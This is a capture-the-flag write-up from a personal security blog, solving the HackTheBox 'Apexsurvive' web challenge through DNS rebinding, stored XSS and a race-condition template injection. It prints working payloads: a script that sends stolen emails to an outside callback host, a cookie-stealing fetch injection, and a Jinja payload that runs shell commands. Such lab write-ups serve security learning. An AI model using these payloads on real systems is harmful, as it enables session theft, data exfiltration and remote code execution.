<!DOCTYPE html>
<html lang="en-us">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta name="generator" content="Hugo 0.123.8">

    

    

    
        
            <meta
                name="description"
                content="ShellUnease Writeups" />
        

        
            <meta
                name="keywords"
                content="itsec,hackthebox" />
        

        
            <meta
                name="author"
                content="ShellUnease" />
        

    


    <title>
        
            HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup |
            ShellUnease Writeups
        
    </title>

    


    
    

    
    


    
    


    
    


    
    

    


    
    

    

    

        
            
            <link
                rel="stylesheet"
                href="/reset.min_6851612176967065231.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/02_style.32bbc9e317885f760335567ffdb38ffb3f78b2ea882ca0c96ea88480ce3e99695dc3db7c636b5bb9ede70de767ebded7a2e75a4c4c73d517d989bce4248a9652.css"
                integrity="sha512-MrvJ4xeIX3YDNVZ//bOP&#43;z94suqILKDJbqiEgM4&#43;mWldw9t8Y2tbue3nDedn697XoudaTExz1RfZibzkJIqWUg==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
        
            
            <link
                rel="stylesheet"
                href="/_theme/css/05_markdown.3a62b6455f48a2646452c5340f1969d117aab5f496c89c3dbd966955329329d5abd02be43fb3bf501d4b056a62d3f4e3e27fb6a2c385921a91d2f3033228a9a8.css"
                integrity="sha512-OmK2RV9IomRkUsU0Dxlp0ReqtfSWyJw9vZZpVTKTKdWr0CvkP7O/UB1LBWpi0/Tj4n&#43;2osOFkhqR0vMDMiipqA==" />
        

    


    
    

    

    

    

    
</head>



    <body>
        <header class="header">
    <div class="header_left">
        
    </div>

    <div class="header_middle">
        
            HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup -
            ShellUnease Writeups
        
    </div>
</header>



        <main>
            <aside class="sidebar">
    



    
    

    
    


    <ul class="section-tree">
        
            
                <li
                    
                        class="dir opened-dir"
                    >
                    <span class="dir-text"> Posts </span>

                    



    
    

    
    


    <ul class="section-tree">
        
            
                <li class="file">
                    <a href="http://localhost:1313/posts/htb-ca-2024-apexsurvive/" title="./posts/htb-ca-2024-apexsurvive/">
                        HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup
                    </a>
                </li>
            
        
    </ul>


                </li>
            
        
    </ul>


</aside>
<aside class="exapandable"></aside>


            
    <article class="main">
        <button
    class="sidebar-toggle-btn"
    type="menu"
    aria-expanded="false"
    aria-haspopup="true">
    <i class="bi bi-list"></i>
</button>



        <div class="title">
            <h1 class="title-header">
                HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup
            </h1>

            <div class="author-date-readtime">
                

                    
                        <div class="author" title="Author">
                            <i class="bi bi-person"></i>
                            <a
                                href="/author/shellunease/"
                                class="cat-btn">
                                ShellUnease
                            </a>
                        </div>
                    

                

                
                    <div class="date" title="Date">
                        <i class="bi bi-calendar3"></i>
                        <time
                            datetime="2024.03.14"
                            >2024.03.14
                        </time>
                    </div>
                

                
                    <div
                        class="readtime"
                        title="Time to Read">
                        <i class="bi bi-clock"></i>
                        4 mins to read
                    </div>
                
            </div>
        </div>

        <div class="article-meta">
            

            

            
                <div class="breadcumb">
                    <i class="bi bi-folder"></i>
                    
    
    




<a href="http://localhost:1313/" class="bread-btn">
    
        <i class="bi bi-house-fill"></i>
    

    
        Home
    
</a>




    /



<a href="http://localhost:1313/posts/" class="bread-btn">
    

    
        Posts
    
</a>




    /



<a href="http://localhost:1313/posts/htb-ca-2024-apexsurvive/" class="bread-btn">
    

    
        HackTheBox Cyber Apocalypse 2024 Apexsurvive Writeup
    
</a>

                </div>
            

            
        </div>

        
            <nav id="TableOfContents">
  <ul>
    <li><a href="#first-steps">First Steps</a></li>
    <li><a href="#dns-rebinding-to-activate-an-internal-user">DNS Rebinding to Activate an Internal User</a></li>
    <li><a href="#stored-xss-to-steal-the-session-cookie-from-the-admin">Stored XSS to Steal the Session Cookie From the Admin</a></li>
    <li><a href="#leveraging-a-race-condition-for-ssti-leading-to-rce">Leveraging a Race Condition for SSTI Leading to RCE</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav>
        


        <div class="content">
            
                <h2 id="first-steps">First Steps</h2>
<p>We analyze the code and notice the email page will only show emails addressed to <em><a href="mailto:test@email.htb">test@email.htb</a></em>.</p>
<p><img src="test-email.png" alt="EmailCode"></p>
<p>We create a user with the email <em><a href="mailto:test@email.htb">test@email.htb</a></em> and confirm the registration by visiting the link from an email.</p>
<p><img src="verify-email-1.png" alt="Verify email 1"></p>
<p><img src="verify-email-2.png" alt="Verify email 2"></p>
<h2 id="dns-rebinding-to-activate-an-internal-user">DNS Rebinding to Activate an Internal User</h2>
<p>Upon further code inspection, we found out that users who sign up with an email hosted at <em>apexsurvive.htb</em> will be marked as internal users.</p>
<p><img src="apexsurvive-email.png" alt="VerificationCode"></p>
<p>There&rsquo;s an <em>/external</em> API endpoint that can be used for an open redirect.</p>
<p><img src="open-redirect.png" alt="Open redirect"></p>
<p>The emails are served by Mailhog running on port 9000 and can be internally retrieved by using the <em>/api/v2/messages</em> endpoint.</p>
<p><img src="mailhog-port.png" alt="Mailhog port"></p>
<p>We create a user <em><a href="mailto:asdf@apexsurvive.htb">asdf@apexsurvive.htb</a></em>.</p>
<p><img src="apex-register.png" alt="Apex register"></p>
<p>We log in and request a verification email. It won&rsquo;t appear in emails on the website.</p>
<p><img src="apex-verify.png" alt="Apex verify"></p>
<p>We&rsquo;ll use the <em>/external</em> endpoint for an open redirect to our controlled website and then do DNS rebinding to fetch emails from Mailhog running on port 9000 and get the confirmation email for the internal user. To do this, we&rsquo;ll set up an EC2 instance with a public IP address and then add a DNS NS record for it (keep in mind the dot at the end):</p>
<p><img src="dns-config.png" alt="DNS config"></p>
<p>We have to allow incoming traffic from ports UDP 53 (for DNS) and TCP 9000 (for the HTTP server) at minimum. We configure the security group of our EC2 instance as following.</p>
<p><img src="security-group.png" alt="Security group configuration"></p>
<p>On the instance, we&rsquo;ll run <a href="https://github.com/mogwailabs/DNSrebinder">https://github.com/mogwailabs/DNSrebinder</a> to change the resolution of my domain from EC2 public IP address to 127.0.0.1 after a moment:</p>
<pre><code>sudo python3 dnsrebinder.py --domain dynamic.mywebsite.xyz. --rebind 127.0.0.1 --ip &lt;website-public-ip&gt; --counter 1 --udp --ttl 1
</code></pre>
<p>We&rsquo;ll also run an HTTP server on it serving index.html that keeps fetching /api/v2/messages for Mailhog emails and then sends them back to us. <strong>Remember it has to be on the same origin (port 9000).</strong></p>
<pre><code>sudo python3 -m http.server 9000
</code></pre>
<p><em>index.html</em> served by the HTTP server:</p>
<pre><code>&lt;html&gt;
&lt;body&gt;
&lt;script&gt;
    (function () {
        var axhr = new XMLHttpRequest();
        axhr.open('GET', 'http://myburpcollab.oastify.com?start=start');
        axhr.send()
        var interval = setInterval(function () {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://dynamic.mywebsite.xyz:9000/api/v2/messages', false);
            xhr.onload = function () {
                if (xhr.status != 200) { return; }
                var xhr2 = new XMLHttpRequest();
                xhr2.open('GET', `http://myburpcollab.oastify.com?msgs=${btoa(this.responseText)}`);
                xhr2.send();
            };
            xhr.send()
        }, 200)
    })();
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>The script keeps fetching <em><a href="http://dynamic.mywebsite.xyz:9000/api/v2/messages">http://dynamic.mywebsite.xyz:9000/api/v2/messages</a></em> in short intervals. which is on the same origin. After a while our DNS rebinder should switch from the EC2 IP address to localhost. Then, the script will successfully fetch the emails and send them back to us in base64.</p>
<p>We log in as <em><a href="mailto:test@email.htb">test@email.htb</a></em> and report:</p>
<pre><code>../external?url=http://dynamic.mywebsite.xyz:9000/
</code></pre>
<p>We notice how after a short moment our DNS server starts resolving our domain to 127.0.0.1 instead of our public API.</p>
<p><img src="dns-rebind.png" alt="DNS rebind"></p>
<p>It might take about 1 minute before the domain resolution is updated to 127.0.0.1. The first callback after the one with query parameter <em>start=start</em> one contains base64 encoded emails from Mailhog API. We decode them and get the confirmation link for the internal user.</p>
<p><img src="exfiltrated-emails.png" alt="Exfiltrated emails">
<img src="base64-emails.png" alt="Base64 emails"></p>
<h2 id="stored-xss-to-steal-the-session-cookie-from-the-admin">Stored XSS to Steal the Session Cookie From the Admin</h2>
<p>As an internal user, we now can add products. In <em>/application/templates/product.html</em> we notice that the <em>product.note</em> (Product manual) from an input controlled by us is not sanitized and allows us to escape JS backticks.</p>
<p><img src="product-note.png" alt="Product note JS string escape"></p>
<p>We add any new product and in the product manual we put in:</p>
<pre><code>`;fetch(&quot;https://myburpcollab.oastify.com/xss?c=&quot;+document.cookie);let x=`
</code></pre>
<p><img src="add-product.png" alt="Add product"></p>
<p>We double-check we escaped JS backticks after adding the product:</p>
<p><img src="js-backtick-escape.png" alt="JS backtick escape"></p>
<p>After we create it, we make the admin visit it by reporting its assigned product number. We take the admin session cookie from the callback.</p>
<p><img src="admin-session-xss.png" alt="Admin session XSS"></p>
<h2 id="leveraging-a-race-condition-for-ssti-leading-to-rce">Leveraging a Race Condition for SSTI Leading to RCE</h2>
<p>As an admin, we now can add PDF contracts. We notice that:</p>
<ul>
<li>the file is always saved to the same location before checking it’s a PDF,</li>
<li>we can save the file anywhere by path traversal using “..” in the filename,</li>
<li>the PDF check takes the temporary file from the file system, not directly from the request.</li>
</ul>
<p><img src="pdf-upload-race-condition.png" alt="Race condition in PDF upload"></p>
<p>As a result, <strong>there’s a race condition between saving the temp file and checking that it’s a PDF.</strong></p>
<p>We prepare 2 files:</p>
<ol>
<li>
<p>a small PDF,</p>
</li>
<li>
<p>a Jinja template that’ll read out the flag:</p>
<pre><code> Result {{ self.__init__.__globals__.__builtins__.__import__('os').system('/readflag &gt; /app/application/static/images/flag.txt') }}
</code></pre>
</li>
</ol>
<p>We upload both and add them to a burp repeater group like so:</p>
<p><img src="burp-parallel-1.png" alt="Burp parallel requests setup 1">
<img src="burp-parallel-2.png" alt="Burp parallel requests setup 2"></p>
<p>We try sending them multiple times using “Send group (parallel)”. We can play around with the number of PDF/Jinja template requests in the group. We watch out for <em>message: Contract added</em> in a response to a Jinja template upload. We check for it by refreshing any product page multiple times. If we see our payload, the flag is available under <em>/static/images/flag.txt</em>.</p>
<p><img src="result-0.png" alt="Result 0">
<img src="apex-flag.png" alt="Apex flag"></p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://unit42.paloaltonetworks.com/dns-rebinding/">https://unit42.paloaltonetworks.com/dns-rebinding/</a></li>
<li><a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></li>
<li><a href="https://portswigger.net/research/smashing-the-state-machine">https://portswigger.net/research/smashing-the-state-machine</a></li>
</ul>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ®.</li>
            

            
                <li>ShellUnease</li>
            

            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        754
                    
                </li>
            

            
            

            
                <li>en</li>
            

            
                <li>
                    <a href="https://gohugo.io" class="btn" target="_blank"
                        >Hugo: 0.123.8</a
                    >
                </li>
            

            
                <li>
                    <a
                        href="https://github.com/JingWangTW/dark-theme-editor"
                        class="btn"
                        target="_blank"
                        >Theme: dark-theme-editor</a
                    >
                </li>
            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Mar 14 2024 17:38:37
                        </time>
                    
                </li>
            

            
                <li title="">
                    
                </li>
            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
